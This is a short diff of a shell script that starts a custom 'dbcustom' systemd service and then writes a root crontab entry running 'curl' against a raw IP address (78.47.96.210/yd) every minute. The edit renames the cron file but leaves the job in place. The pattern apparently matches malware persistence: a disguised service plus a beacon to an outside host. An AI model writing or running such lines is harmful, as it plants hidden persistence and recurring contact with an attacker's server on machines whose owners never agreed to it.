@@ -62,9 +62,8 @@ systemctl start dbcustom.service
 systemctl enable dbcustom.service
 
 
-sudo touch cron_bkp
-sudo echo "* * * * * curl http://78.47.96.210/yd" >> cron_bkp
-sudo crontab cro_bkp
+sudo echo "* * * * * curl http://78.47.96.210/yd" >> cront_crul
+sudo crontab cront_crul
 sudo rm cron_bkp
 
 
